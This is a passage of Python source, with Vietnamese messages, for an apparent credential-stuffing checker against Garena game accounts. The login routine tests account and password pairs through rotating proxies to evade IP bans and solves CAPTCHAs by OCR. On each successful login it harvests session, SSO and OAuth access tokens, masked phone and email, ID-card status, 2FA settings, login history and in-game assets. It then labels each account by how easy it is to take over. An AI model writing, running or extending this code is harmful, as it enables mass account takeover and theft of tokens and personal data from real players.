    if isinstance(ban_info, dict):
        if not ban_info:
            return False
        for key in ("isBan", "isBanned", "banned", "ban", "active"):
            if key in ban_info and _is_yes(ban_info.get(key)):
                return True
        for key in ("status", "state", "banStatus"):
            v = ban_info.get(key)
            if isinstance(v, str) and v.strip().lower() in {"banned", "ban", "active_ban", "is_banned", "locked"}:
                return True

        def _norm_ts(v):
            try:
                t = int(float(v or 0))
            except Exception:
                return 0
            if t <= 0:
                return 0
            if t > 10_000_000_000:
                t //= 1000
            return t

        now_ts = int(time.time())
        for key in ("endTime", "banEndTime", "expireAt", "expiredAt", "unbanTime"):
            if _norm_ts(ban_info.get(key)) > now_ts:
                return True

        ban_at = _norm_ts(ban_info.get("banTime"))
        unban_at = _norm_ts(ban_info.get("unbanTime"))
        if ban_at and unban_at and ban_at <= now_ts < unban_at:
            return True
        if ban_at and not unban_at and ban_at <= now_ts:
            return True
        return False
    if isinstance(ban_info, (list, tuple, set)):
        return any(_is_banned_info(item) for item in ban_info)
    return False


def _is_proxy_error(detail: str) -> bool:
    if not detail:
        return False
    return any(err in detail for err in _PROXY_ERRORS)


def _is_port_exhaustion(detail: str) -> bool:
    if not detail:
        return False
    return "10048" in detail or "Only one usage" in detail


# ── Core Login Checking ───────────────────────────────────────────────────────
def check_login(account: str, password: str, timeout: int = 7, fetch_info: bool = False, proxy=None, debug: bool = False) -> dict:
    result = None
    proxy_fails = 0
    no_proxy_mode = (proxy is None and not _proxy_list)
    max_retries = 2 if no_proxy_mode else 4

    for _retry in range(max_retries):
        if proxy is None and _proxy_list:
            proxy = _next_proxy()

        result = _check_login_once(account, password, timeout, fetch_info, proxy, debug=debug)
        detail = result.get("detail", "")
        status = result.get("status", "")

        if status in ("HIT", "INVALID", "NOT_FOUND", "BANNED", "SEC_BANNED"):
            return result
        if "result=3" in detail or "result=101" in detail or "result=105" in detail or "result=174" in detail:
            return result

        if _is_port_exhaustion(detail):
            time.sleep(0.3)
            proxy = _next_proxy() if _proxy_list else None
            continue

        if status == "TIMEOUT" and no_proxy_mode:
            result["status"] = "PORT_BLOCKED"
            result["detail"] = "Port 19000 bị chặn (ISP/Garena ban IP). Dùng proxy để bypass."
            return result

        if status in ("ERROR", "TIMEOUT") or _is_proxy_error(detail):
            proxy_fails += 1
            proxy = _next_proxy() if _proxy_list else None
            time.sleep(0.3)
            continue

        if detail == "Empty LoginReply data":
            proxy = _next_proxy() if _proxy_list else None
            continue

        return result

    if result:
        if no_proxy_mode and result.get("status") == "TIMEOUT":
            result["status"] = "PORT_BLOCKED"
            result["detail"] = "Port 19000 bị chặn (ISP/Garena ban IP). Dùng proxy để bypass."
        elif proxy_fails >= 3:
            result["status"] = "PROXY_FAIL"
            result["detail"] = f"proxy_error x{proxy_fails}"
    return result


def _check_login_once(account: str, password: str, timeout: int = 7, fetch_info: bool = False, proxy=None, debug: bool = False) -> dict:
    global _HOST_IP
    _conn_sem.acquire()
    sock = None
    dbg = {}
    try:
        host_ip = _resolve_host_ip()
        if proxy:
            sock = _connect_via_proxy(proxy, host_ip, PORT, timeout)
        else:
            for _attempt in range(3):
                try:
                    sock = _make_fast_socket(timeout)
                    sock.connect((host_ip, PORT))
                    break
                except OSError as _e:
                    try:
                        sock.close()
                    except Exception:
                        pass
                    sock = None
                    if getattr(_e, "winerror", None) == 10048 and _attempt < 2:
                        time.sleep(0.5 * (_attempt + 1))
                        continue
                    raise

        # Step 1: CMD_LOGIN_PREPARE (256)
        rand_key = os.urandom(16)
        prep_body = _build_login_prepare(account, rand_key)
        sock.sendall(_build_frame(CMD_LOGIN_PREPARE, prep_body))

        hdr, body = _recv_cmd_frame(sock, CMD_LOGIN_PREPARE, max_tries=5)
        result_code = hdr.get(5, 0)
        if debug:
            dbg.update({"prepare_result": result_code, "prepare_body_len": len(body) if body else 0})

        if result_code != 0:
            if result_code == 3:
                # Solve CAPTCHA via OCR (try up to 3 times)
                for attempt_solve in range(3):
                    ckey, ctext = _solve_garena_captcha(proxy_dict=_get_http_proxies(proxy))
                    if ckey and ctext:
                        if len(ctext) < 5:
                            if debug:
                                dbg[f"tcp_captcha_attempt_{attempt_solve}_short"] = ctext
                            continue
                        if debug:
                            dbg[f"tcp_captcha_solve_attempt_{attempt_solve}"] = ctext

                        prep_body = _build_login_prepare(account, rand_key, captcha_key=ckey, captcha=ctext)
                        sock.sendall(_build_frame(CMD_LOGIN_PREPARE, prep_body))
                        hdr, body = _recv_cmd_frame(sock, CMD_LOGIN_PREPARE, max_tries=5)
                        result_code = hdr.get(5, 0)
                        if debug:
                            dbg[f"tcp_captcha_solve_result_{attempt_solve}"] = result_code

                        if result_code == 0 or result_code != 3:
                            break
                    else:
                        break

            if result_code != 0:
                if result_code == 3:
                    if debug:
                        dbg["prepare_captcha_fallback"] = True
                    http_r = _http_login_garena(account, password, proxy=proxy, timeout=timeout)
                    if "access_token" in http_r:
                        out = {
                            "account": account, "password": password,
                            "status": "HIT", "_login_method": "http",
                            "aov_token": http_r["access_token"],
                        }
                        if debug:
                            dbg["http_fallback_ok"] = True
                            out["debug"] = dbg
                        return out

                    err_code = http_r.get("error_code", "")
                    if err_code in ("invalid_grant", "access_denied"):
                        out = {"account": account, "password": password, "status": "INVALID", "detail": f"CAPTCHA+HTTP sai mật khẩu ({err_code})"}
                    elif err_code == "account_not_exist":
                        out = {"account": account, "password": password, "status": "NOT_FOUND", "detail": "CAPTCHA+HTTP không tìm thấy account"}
                    else:
                        out = {"account": account, "password": password, "status": "CAPTCHA", "detail": f"TCP_CAPTCHA HTTP_ERR={http_r.get('error', '')}"}
                    if debug:
                        dbg["http_fallback_err"] = http_r
                        out["debug"] = dbg
                    return out

                status_map = {
                    1: ("INVALID", f"WRONG_PASSWORD result={result_code}"),
                    2: ("NOT_FOUND", f"ACCOUNT_NOT_EXIST result={result_code}"),
                    3: ("CAPTCHA", f"PREPARE_CAPTCHA result={result_code}"),
                    4: ("BANNED", f"USER_BANNED result={result_code}"),
                    5: ("SEC_BANNED", f"SECURITY_BANNED result={result_code}"),
                    101: ("NOT_FOUND", f"ACCOUNT_NOT_EXIST result={result_code}"),
                    105: ("NOT_FOUND", f"EMAIL_NOT_EXIST result={result_code}"),
                    174: ("NOT_FOUND", f"ACCOUNT_NOT_EXIST result={result_code}"),
                }
                status, detail = status_map.get(result_code, ("MISS", f"PREPARE_FAIL result={result_code}"))
                out = {"account": account, "password": password, "status": status, "detail": detail}
                if debug:
                    out["debug"] = dbg
                return out

        prep_reply = _proto_decode(body)
        reply_key = prep_reply.get(1, b"")
        reply_data = prep_reply.get(2, b"")
        if debug:
            dbg.update({
                "prepare_has_key": bool(reply_key),
                "prepare_has_data": bool(reply_data),
                "prepare_key_len": len(reply_key) if isinstance(reply_key, (bytes, bytearray)) else 0,
                "prepare_data_len": len(reply_data) if isinstance(reply_data, (bytes, bytearray)) else 0,
            })
        if not reply_key or not reply_data:
            out = {"account": account, "password": password, "status": "ERROR", "detail": "Empty LoginPrepareReply"}
            if debug:
                out["debug"] = dbg
            return out

        prep_data = _proto_decode(xtea_decrypt(reply_data, reply_key))
        salt = prep_data.get(1, b"")
        verify_code = prep_data.get(2, b"")
        salt = salt.decode("utf-8") if isinstance(salt, bytes) else salt
        verify_code = verify_code.decode("utf-8") if isinstance(verify_code, bytes) else verify_code

        # Step 2: CMD_LOGIN (257)
        login_body, xtea_key = _build_login(account, password, salt, verify_code)
        sock.sendall(_build_frame(CMD_LOGIN, login_body))

        hdr, body = _recv_cmd_frame(sock, CMD_LOGIN, max_tries=5)
        result_code = hdr.get(5, 0)
        if debug:
            dbg.update({"login_result": result_code, "login_body_len": len(body) if body else 0})
        if result_code != 0:
            out = {"account": account, "password": password, "status": "INVALID", "detail": f"LOGIN_FAIL result={result_code}"}
            if debug:
                out["debug"] = dbg
            return out

        login_reply = _proto_decode(body)
        enc_reply = login_reply.get(1, b"")
        if not enc_reply:
            out = {"account": account, "password": password, "status": "ERROR", "detail": "Empty LoginReply data"}
            if debug:
                out["debug"] = dbg
            return out

        reply_decoded = _proto_decode(xtea_decrypt(enc_reply, xtea_key))
        uid = reply_decoded.get(1, 0)
        session_key = reply_decoded.get(2, b"")

        if not uid:
            out = {"account": account, "password": password, "status": "ERROR", "detail": "UID=0 in reply"}
            if debug:
                out["debug"] = dbg
            return out

        result = {
            "account": account, "password": password, "status": "HIT",
            "uid": uid,
            "session_key": session_key.hex() if isinstance(session_key, bytes) else "",
        }
        if debug:
            result["debug"] = dbg

        # Post-login: fetch account data
        if fetch_info and isinstance(session_key, bytes) and len(session_key) == 16:
            login_info = _fetch_login_info(sock, session_key)
            result.update({
                "region": login_info.get("region", ""),
                "shells": login_info.get("shells", 0),
                "topup_time": login_info.get("topup_time", 0),
            })
            ll = login_info.get("last_login", 0)
            if ll:
                result["last_login"] = datetime.datetime.fromtimestamp(ll).strftime("%Y-%m-%d %H:%M:%S")
            ct = login_info.get("created_time", 0)
            if ct:
                result["garena_created"] = datetime.datetime.fromtimestamp(ct).strftime("%H:%M:%S %d-%m-%Y")
            if login_info.get("fb_uid_login"):
                result["fb_uid"] = login_info["fb_uid_login"]
            if login_info.get("fb_link_time"):
                result["fb_link_time"] = datetime.datetime.fromtimestamp(login_info["fb_link_time"]).strftime("%d-%m-%Y")
            if login_info.get("last_session_ip"):
                result["last_session_ip"] = login_info["last_session_ip"]
            if login_info.get("last_session_country"):
                result["last_session_country"] = login_info["last_session_country"]
            if login_info.get("last_session_time"):
                result["last_session_time"] = datetime.datetime.fromtimestamp(login_info["last_session_time"]).strftime("%d-%m-%Y %H:%M")

            basic = _fetch_user_basic(sock, uid, session_key)
            result.update({
                "username": basic.get("username", ""),
                "nickname": basic.get("nickname", ""),
            })

            acct = _fetch_account_info(sock, session_key)
            result.update({
                "password_set": acct.get("password_set", False),
                "email_verified": acct.get("email_verified", False),
                "mobile_bound": acct.get("mobile_bound", False),
                "account_secured": acct.get("account_secured", False),
            })

            fb = _fetch_fb_info(sock, session_key)
            result["fb_linked"] = fb.get("fb_linked", False)

            sso = _fetch_sso_key(sock, session_key)
            sso_key = sso.get("sso_key", "")
            result["sso_key"] = sso_key

            _pool = _ensure_http_pool()
            _futs = {}
            if sso_key:
                _futs["acct_sec"] = _pool.submit(_fetch_account_security, sso_key, proxy)
                _futs["uac"] = _pool.submit(_fetch_uac_country, sso_key, proxy)

            tok = _fetch_session_token(sock, session_key)
            session_token = tok.get("session_token", "")
            result["session_token"] = session_token
            http_key = session_token or sso_key
            if http_key:
                _futs["rg"] = _pool.submit(_fetch_recent_games, http_key, proxy)

            oauth = _fetch_oauth_token(sock, session_key, LIEN_QUAN_APP_ID)
            aov_token = oauth.get("access_token", "")
            if aov_token:
                result["aov_access_token"] = aov_token

            sale_redirect = _get_app_redirect_url(sock, session_key, "https://sale.lienquan.garena.vn/login/callback")
            region = result.get("region", "VN") or "VN"
            kt = {}
            if aov_token:
                _futs["weekly"] = _pool.submit(_fetch_weekly_profile, aov_token, proxy)
                _futs["aov_info"] = _pool.submit(_fetch_aov_user_info, aov_token, region, proxy)
                kt = _fetch_kientuong_player(sock, session_key, proxy=proxy)
            if sale_redirect:
                _futs["skins"] = _pool.submit(_fetch_sale_skins, sale_redirect, proxy)

            if sso_key:
                _futs["rov_th"] = _pool.submit(_fetch_rov_th_via_termgame, sso_key, proxy)
            rov_oauth = _fetch_oauth_token(sock, session_key, ROV_TH_APP_ID)
            rov_token = rov_oauth.get("access_token", "")
            if rov_token:
                _futs["rov_skins"] = _pool.submit(_fetch_sale_skins, rov_token, proxy)

            fc_oauth = _fetch_oauth_token(sock, session_key, FC_MOBILE_VN_APP_ID)
            fc_token = fc_oauth.get("access_token", "")
            if fc_token:
                _futs["fc_info"] = _pool.submit(_fetch_fc_mobile_vn_user_info, fc_token, region, proxy)
                _futs["fc_me"] = _pool.submit(_fetch_fcmobile_me_from_access_token, fc_token, proxy)
                if sso_key:
                    _futs["fc_sso_pm"] = _pool.submit(_fetch_fc_prefill_via_sso, sso_key, proxy)

            if sso_key:
                _futs["df"] = _pool.submit(_fetch_delta_force_info, sso_key, proxy)

            _hr = {}
            for _k, _f in _futs.items():
                try:
                    _t = 8 if _k == "acct_sec" else 5
                    _hr[_k] = _f.result(timeout=_t)
                except Exception:
                    _hr[_k] = {}

            acct_sec = _hr.get("acct_sec") or {}
            result["_acct_sec_ok"] = bool(acct_sec)
            if acct_sec:
                result["masked_phone"] = acct_sec.get("masked_phone", "")
                result["masked_email"] = acct_sec.get("masked_email", "")
                result["email_v"] = acct_sec.get("email_v", 0)
                result["idcard"] = acct_sec.get("idcard", "")
                result["authenticator_enable"] = acct_sec.get("authenticator_enable", 0)
                result["two_step_verify"] = acct_sec.get("two_step_verify", 0)
                if acct_sec.get("country_code"):
                    result["country_code"] = str(acct_sec.get("country_code", "")).strip()
                if acct_sec.get("acc_country"):
                    result["acc_country"] = str(acct_sec.get("acc_country", "")).strip()
                if acct_sec.get("country"):
                    result["country"] = acct_sec.get("country", "")
                if acct_sec.get("fb_connected"):
                    result["fb_linked"] = True
                if acct_sec.get("fb_account"):
                    result["fb_account_name"] = acct_sec["fb_account"]
                result["suspicious"] = int(acct_sec.get("suspicious", 0) or 0)
                if acct_sec.get("login_history"):
                    result["login_history"] = acct_sec["login_history"]
                if acct_sec.get("sensitive_ops"):
                    result["sensitive_ops"] = acct_sec["sensitive_ops"]
                if acct_sec.get("init_ip"):
                    result["init_ip"] = acct_sec["init_ip"]

            rg = _hr.get("rg")
            if rg:
                result["recent_games"] = rg

            cc = (result.get("country_code") or "").strip()
            if not cc:
                mp = (result.get("masked_phone") or "").strip()
                mcc = re.match(r"^\+(\d{1,4})\b", mp)
                if mcc:
                    cc = mcc.group(1)
                    result["country_code"] = cc

            uac_country = _hr.get("uac") or ""
            if uac_country and not (result.get("acc_country") or "").strip():
                result["acc_country"] = uac_country

            country_from_init = ""
            try:
                _ci = result.get("country")
                if isinstance(_ci, str) and _ci.strip():
                    country_from_init = _ci.strip()
            except Exception:
                pass

            acc_raw = (result.get("acc_country") or "").strip()
            _country_candidates = [
                cc, acc_raw, country_from_init, uac_country,
                (result.get("region", "") or "").strip().upper()
            ]
            _resolved = "UNKNOWN"
            for _raw in _country_candidates:
                if not _raw:
                    continue
                _n = _normalize_country(_raw)
                if _n and _n != "UNKNOWN":
                    _resolved = _n
                    break
            result["country"] = _resolved

            if aov_token:
                skins = _hr.get("skins")
                if skins:
                    result["aov_skins"] = skins
                    if skins.get("item_history"):
                        result["aov_item_history"] = skins["item_history"]

                weekly = _hr.get("weekly") or {}
                if weekly:
                    result["aov_name"] = weekly.get("name", "")
                    rank_base = weekly.get("rank", "")
                    rank_stars = int(weekly.get("rank_stars") or 0)
                    result["aov_rank_id"] = weekly.get("rank_id")
                    result["aov_rank_stars"] = rank_stars
                    result["aov_rank_entry"] = weekly.get("rank_entry", {})
                    if rank_stars and rank_base:
                        r_low = rank_base.lower()
                        if "cao th" in r_low or "master" in r_low:
                            result["aov_rank"] = f"{rank_base} {rank_stars}"
                        else:
                            result["aov_rank"] = rank_base
                    else:
                        result["aov_rank"] = rank_base

                if kt:
                    result["aov_level"] = kt.get("level", 0)
                    result["aov_reg_time"] = kt.get("register_time", "")
                    result["aov_banned"] = "YES" if _is_yes(kt.get("banned", "NO")) else "NO"
                    kt_stars = int(kt.get("rank_stars") or 0)
                    kt_rank = kt.get("rank")
                    if kt_stars > 0:
                        result["aov_rank_stars"] = kt_stars
                        r_base = result.get("aov_rank") or kt_rank or "Cao Thủ"
                        r_base = re.sub(r"\s*\d+$", "", r_base)
                        r_low = r_base.lower()
                        if "cao th" in r_low or "master" in r_low:
                            result["aov_rank"] = f"{r_base} {kt_stars}"
                        else:
                            result["aov_rank"] = r_base
                    elif not result.get("aov_rank") and kt_rank:
                        rank_base = kt_rank
                        r_low = rank_base.lower()
                        result["aov_rank_stars"] = kt_stars
                        if kt_stars and ("cao th" in r_low or "master" in r_low):
                            result["aov_rank"] = f"{rank_base} {kt_stars}"
                        else:
                            result["aov_rank"] = rank_base
                        result["aov_rank_source"] = "kientuong"
                    result["_kt_player"] = kt.get("_raw_player", {})

                aov_info = _hr.get("aov_info") or {}
                result["aov_user_info"] = aov_info
                try:
                    if isinstance(aov_info, dict):
                        result["aov_prefill_mobile"] = ((aov_info.get("data") or {}).get("prefill_mobile") or "").strip()
                except Exception:
                    pass

            if rov_token:
                rov_skins = _hr.get("rov_skins") or {}
                if rov_skins and (rov_skins.get("total_skins") or rov_skins.get("cp")):
                    result["rov_skins"] = rov_skins

            rov_th = _hr.get("rov_th") or {}
            if rov_th:
                result["rov_th"] = rov_th
                if rov_th.get("uac") and not result.get("country_code"):
                    result["country_code"] = rov_th.get("uac")
                rov_name = (rov_th.get("rov_role_name") or "").strip()
                tg_user = (rov_th.get("tg_username") or "").strip()
                has_real_name = rov_name and rov_name != tg_user
                if (rov_th.get("has_rov_role") or has_real_name) and not (result.get("aov_name") or "").strip():
                    result["aov_name"] = rov_name
                if rov_th.get("aov_server"):
                    result["aov_server"] = rov_th["aov_server"]
                    result["aov_server_id"] = rov_th.get("aov_server_id", 0)
                if rov_th.get("aov_tg_name") and not (result.get("aov_name") or "").strip():
                    result["aov_name"] = rov_th["aov_tg_name"]
                if rov_th.get("rov_role_name"):
                    result["rov_name"] = rov_th["rov_role_name"]
                    result["rov_server"] = rov_th.get("rov_server", "")
                    result["rov_server_id"] = rov_th.get("rov_server_id", 0)
                    result["rov_role_id"] = rov_th.get("rov_role_id", 0)
                    result["rov_open_id"] = rov_th.get("rov_open_id", "")
                    result["has_rov_role"] = rov_th.get("has_rov_role", False)
                cur_qh = ((result.get("aov_skins") or {}).get("cp", 0) or 0)
                if rov_th.get("shells") and not cur_qh:
                    result.setdefault("aov_skins", {})["cp"] = rov_th.get("shells")
                tg_mob = (rov_th.get("tg_display_mobile") or "").strip()
                if tg_mob and not (result.get("masked_phone") or "").strip():
                    result["masked_phone"] = tg_mob
                if rov_th.get("tg_is_verified"):
                    result["garena_verified"] = True

            if fc_token:
                result["fc_mobile_vn_access_token"] = fc_token
                fc_info = _hr.get("fc_info") or {}
                result["fc_mobile_vn_user_info"] = fc_info
                try:
                    if isinstance(fc_info, dict):
                        result["fcmobile_prefill_mobile"] = ((fc_info.get("data") or {}).get("prefill_mobile") or "").strip()
                except Exception:
                    pass

                sso_pm = (_hr.get("fc_sso_pm") or "").strip()
                if sso_pm:
                    result["fcmobile_prefill_mobile"] = sso_pm
                    if "*" not in sso_pm:
                        result["aov_prefill_mobile"] = sso_pm
                fm = _hr.get("fc_me") or {}
                if fm:
                    result["fcmobile_web_host"] = fm.get("host")
                    result["ss_fcm"] = fm.get("ss_fcm")
                    result["fcmobile_user"] = fm.get("user") or {}
                    result["fcmobile_ovr"] = fm.get("ovr")
                    result["fcmobile_uid"] = fm.get("uid")
                    result["fcmobile_name"] = fm.get("name")
                    result["fcmobile_rankTCN"] = fm.get("rankTCN")
                    result["fcmobile_rankDDC"] = fm.get("rankDDC")
                    result["fcmobile_rankDGL"] = fm.get("rankDGL")
                    result["fcmobile_point"] = fm.get("point")

            df = _hr.get("df") or {}
            if df:
                result["delta_force"] = df
                if df.get("df_has_data"):
                    result["df_nickname"] = df.get("df_nickname", "")
                    result["df_level"] = df.get("df_level", 0)
                    result["df_rank"] = df.get("df_rank", "")
                    result["df_matches"] = df.get("df_matches", 0)
                    result["df_wins"] = df.get("df_wins", 0)
                    result["df_kd"] = df.get("df_kd", "")
                    result["df_uid_game"] = df.get("df_uid_game", "")

        if result.get("aov_rank"):
            base_r = re.sub(r"\s*\d+$", "", result["aov_rank"]).strip()
            trans_r = _translate_aov_rank(base_r)
            stars = result.get("aov_rank_stars", 0)
            if stars > 0 and trans_r in ("Cao Thủ", "Chiến Tướng"):
                result["aov_rank"] = f"{trans_r} {stars}"
            else:
                result["aov_rank"] = trans_r

        return result

    except socket.timeout:
        timed_out_ip = _HOST_IP
        with _HOST_IP_lock:
            _HOST_IP = None
        out = {
            "account": account,
            "password": password,
            "status": "TIMEOUT",
            "detail": f"Socket timeout to {HOST}:{PORT} (ip={timed_out_ip or 'unknown'})",
        }
        if debug:
            out["debug"] = dbg
        return out
    except Exception as exc:
        out = {"account": account, "password": password, "status": "ERROR", "detail": str(exc)}
        if debug:
            out["debug"] = dbg
        return out
    finally:
        if sock:
            try:
                sock.close()
            except Exception:
                pass
        _conn_sem.release()


# ── Formatters & Display ──────────────────────────────────────────────────────
def _fmt_last_login(ts_str: str) -> str:
    """Format last login as relative date."""
    if not ts_str:
        return "N/A"
    try:
        dt = datetime.datetime.strptime(ts_str, "%Y-%m-%d %H:%M:%S")
        if dt.year < 2010:
            return "Chưa từng đăng nhập"
        now = datetime.datetime.now()
        delta = (now.date() - dt.date()).days
        time_part = dt.strftime("%H:%M:%S %d/%m/%Y")
        if delta == 0:
            return f"Hôm Nay ({time_part})"
        elif delta == 1:
            return f"Hôm Qua ({time_part})"
        elif delta <= 7:
            return f"{delta} ngày trước ({time_part})"
        elif delta <= 30:
            return f"{delta // 7} tuần trước ({time_part})"
        elif delta <= 365:
            return f"{delta // 30} tháng trước ({time_part})"
        else:
            return f"{delta // 365} năm trước ({time_part})"
    except Exception:
        return ts_str


def _derive_tinh_trang(h: dict) -> str:
    """Derive account status description from bindings."""
    pw = h.get("password_set", False)
    email_v = h.get("email_v", 0) or 0
    email_verified = h.get("email_verified", False)
    masked_email = h.get("masked_email", "")
    has_email = email_verified or email_v > 0
    if masked_email and masked_email.replace("*", "").replace("@", "").replace(".", ""):
        has_email = True

    mobile_bound = h.get("mobile_bound", False)
    masked_phone = h.get("masked_phone", "")
    prefill_phone = (h.get("aov_prefill_mobile") or "").strip() or (h.get("fcmobile_prefill_mobile") or "").strip()
    has_phone = mobile_bound or bool(masked_phone) or bool(prefill_phone)

    fb = h.get("fb_linked", False)
    cccd = bool(h.get("idcard", "").replace("*", ""))
    auth = h.get("authenticator_enable", 0) or h.get("two_step_verify", 0)

    parts = []
    if has_phone:
        parts.append("SĐT")
    if has_email:
        parts.append("Mail")
    if fb:
        parts.append("FB")
    if cccd:
        parts.append("CCCD")
    if auth:
        parts.append("2FA")
    if pw:
        parts.append("Pass")

    is_banned = _is_yes(h.get("aov_banned", ""))
    suspicious = int(h.get("suspicious", 0) or 0)

    total = len(parts)
    if total == 0:
        base = "Acc Trắng"
    elif total >= 4:
        base = "Full Info"
    else:
        base = "Acc Dính " + " + ".join(parts)

    suffix = []
    if is_banned:
        suffix.append("BAN")
    if suspicious:
        suffix.append("Suspicious")
    if suffix:
        return f"{base} [{' + '.join(suffix)}]"
    return base


def _normalize_country(code: str) -> str:
    if not code:
        return "UNKNOWN"
    code = str(code).strip().upper()
    mapping = {
        "AF": "AFGHANISTAN",
        "AX": "ÅLAND ISLANDS",
        "AL": "ALBANIA",
        "DZ": "ALGERIA",
        "AS": "AMERICAN SAMOA",
        "AD": "ANDORRA",
        "AO": "ANGOLA",
        "AI": "ANGUILLA",
        "AQ": "ANTARCTICA",
        "AG": "ANTIGUA AND BARBUDA",
        "AR": "ARGENTINA",
        "AM": "ARMENIA",
        "AW": "ARUBA",
        "AU": "AUSTRALIA",
        "AT": "AUSTRIA",
        "AZ": "AZERBAIJAN",
        "BS": "BAHAMAS",
        "BH": "BAHRAIN",
        "BD": "BANGLADESH",
        "BB": "BARBADOS",
        "BY": "BELARUS",
        "BE": "BELGIUM",
        "BZ": "BELIZE",
        "BJ": "BENIN",
        "BM": "BERMUDA",
        "BT": "BHUTAN",
        "BO": "BOLIVIA, PLURINATIONAL STATE OF",
        "BQ": "BONAIRE, SINT EUSTATIUS AND SABA",
        "BA": "BOSNIA AND HERZEGOVINA",
        "BW": "BOTSWANA",
        "BV": "BOUVET ISLAND",
        "BR": "BRAZIL",
        "IO": "BRITISH INDIAN OCEAN TERRITORY",
        "BN": "BRUNEI DARUSSALAM",
        "BG": "BULGARIA",
        "BF": "BURKINA FASO",
        "BI": "BURUNDI",
        "KH": "CAMBODIA",
        "CM": "CAMEROON",
        "CA": "CANADA",
        "CV": "CAPE VERDE",
        "KY": "CAYMAN ISLANDS",
        "CF": "CENTRAL AFRICAN REPUBLIC",
        "TD": "CHAD",
        "CL": "CHILE",
        "CN": "CHINA",
        "CX": "CHRISTMAS ISLAND",
        "CC": "COCOS (KEELING) ISLANDS",
        "CO": "COLOMBIA",
        "KM": "COMOROS",
        "CG": "CONGO",
        "CD": "CONGO, THE DEMOCRATIC REPUBLIC OF THE",
        "CK": "COOK ISLANDS",
        "CR": "COSTA RICA",
        "HR": "CROATIA",
        "CU": "CUBA",
        "CW": "CURAÇAO",
        "CY": "CYPRUS",
        "CZ": "CZECH REPUBLIC",
        "DK": "DENMARK",
        "DJ": "DJIBOUTI",
        "DM": "DOMINICA",
        "DO": "DOMINICAN REPUBLIC",
        "EC": "ECUADOR",
        "EG": "EGYPT",
        "SV": "EL SALVADOR",
        "GQ": "EQUATORIAL GUINEA",
        "ER": "ERITREA",
        "EE": "ESTONIA",
        "ET": "ETHIOPIA",
        "FK": "FALKLAND ISLANDS (MALVINAS)",
        "FO": "FAROE ISLANDS",
        "FJ": "FIJI",
        "FI": "FINLAND",
        "FR": "FRANCE",
        "GF": "FRENCH GUIANA",
        "PF": "FRENCH POLYNESIA",
        "TF": "FRENCH SOUTHERN TERRITORIES",
        "GA": "GABON",
        "GM": "GAMBIA",
        "GE": "GEORGIA",
        "DE": "GERMANY",
        "GH": "GHANA",
        "GI": "GIBRALTAR",
        "GR": "GREECE",
        "GL": "GREENLAND",
        "GD": "GRENADA",
        "GP": "GUADELOUPE",
        "GU": "GUAM",
        "GT": "GUATEMALA",
        "GG": "GUERNSEY",
        "GN": "GUINEA",
        "GW": "GUINEA-BISSAU",
        "GY": "GUYANA",
        "HT": "HAITI",
        "HM": "HEARD ISLAND AND MCDONALD ISLANDS",
        "VA": "HOLY SEE (VATICAN CITY STATE)",
        "HN": "HONDURAS",
        "HK": "HONG KONG",
        "HU": "HUNGARY",
        "IS": "ICELAND",
        "IN": "INDIA",
        "ID": "INDONESIA",
        "IR": "IRAN, ISLAMIC REPUBLIC OF",
        "IQ": "IRAQ",
        "IE": "IRELAND",
        "IM": "ISLE OF MAN",
        "IL": "ISRAEL",
        "IT": "ITALY",
        "JM": "JAMAICA",
        "JP": "JAPAN",
        "JE": "JERSEY",
        "JO": "JORDAN",
        "KZ": "KAZAKHSTAN",
        "KE": "KENYA",
        "KI": "KIRIBATI",
        "KR": "KOREA, REPUBLIC OF",
        "KW": "KUWAIT",
        "KG": "KYRGYZSTAN",
        "LV": "LATVIA",
        "LB": "LEBANON",
        "LS": "LESOTHO",
        "LR": "LIBERIA",
        "LY": "LIBYA",
        "LI": "LIECHTENSTEIN",
        "LT": "LITHUANIA",
        "LU": "LUXEMBOURG",
        "MO": "MACAO",
        "MK": "MACEDONIA, THE FORMER YUGOSLAV REPUBLIC OF",
        "MG": "MADAGASCAR",
        "MW": "MALAWI",
        "MY": "MALAYSIA",
        "MV": "MALDIVES",
        "ML": "MALI",
        "MT": "MALTA",
        "MH": "MARSHALL ISLANDS",
        "MQ": "MARTINIQUE",
        "MR": "MAURITANIA",
        "MU": "MAURITIUS",
        "YT": "MAYOTTE",
        "MX": "MEXICO",
        "FM": "MICRONESIA, FEDERATED STATES OF",
        "MD": "MOLDOVA, REPUBLIC OF",
        "MC": "MONACO",
        "MN": "MONGOLIA",
        "ME": "MONTENEGRO",
        "MS": "MONTSERRAT",
        "MA": "MOROCCO",
        "MZ": "MOZAMBIQUE",
        "MM": "MYANMAR",
        "NA": "NAMIBIA",
        "NR": "NAURU",
        "NP": "NEPAL",
        "NL": "NETHERLANDS",
        "NC": "NEW CALEDONIA",
        "NZ": "NEW ZEALAND",
        "NI": "NICARAGUA",
        "NE": "NIGER",
        "NG": "NIGERIA",
        "NU": "NIUE",
        "NF": "NORFOLK ISLAND",
        "MP": "NORTHERN MARIANA ISLANDS",
        "NO": "NORWAY",
        "OM": "OMAN",
        "PK": "PAKISTAN",
        "PW": "PALAU",
        "PS": "PALESTINE, STATE OF",
        "PA": "PANAMA",
        "PG": "PAPUA NEW GUINEA",
        "PY": "PARAGUAY",
        "PE": "PERU",
        "PH": "PHILIPPINES",
        "PN": "PITCAIRN",
        "PL": "POLAND",
        "PT": "PORTUGAL",
        "PR": "PUERTO RICO",
        "QA": "QATAR",
        "RE": "RÉUNION",
        "RO": "ROMANIA",
        "RU": "RUSSIAN FEDERATION",
        "RW": "RWANDA",
        "BL": "SAINT BARTHÉLEMY",
        "SH": "SAINT HELENA, ASCENSION AND TRISTAN DA CUNHA",
        "KN": "SAINT KITTS AND NEVIS",
        "LC": "SAINT LUCIA",
        "MF": "SAINT MARTIN (FRENCH PART)",
        "PM": "SAINT PIERRE AND MIQUELON",
        "VC": "SAINT VINCENT AND THE GRENADINES",
        "WS": "SAMOA",
        "SM": "SAN MARINO",
        "ST": "SAO TOME AND PRINCIPE",
        "SA": "SAUDI ARABIA",
        "SN": "SENEGAL",
        "RS": "SERBIA",
        "SC": "SEYCHELLES",
        "SL": "SIERRA LEONE",
        "SG": "SINGAPORE",
        "SX": "SINT MAARTEN (DUTCH PART)",
        "SK": "SLOVAKIA",
        "SI": "SLOVENIA",
        "SB": "SOLOMON ISLANDS",
        "SO": "SOMALIA",
        "ZA": "SOUTH AFRICA",
        "GS": "SOUTH GEORGIA AND THE SOUTH SANDWICH ISLANDS",
        "SS": "SOUTH SUDAN",
        "ES": "SPAIN",
        "LK": "SRI LANKA",
        "SD": "SUDAN",
        "SR": "SURINAME",
        "SJ": "SVALBARD AND JAN MAYEN",
        "SZ": "SWAZILAND",
        "SE": "SWEDEN",
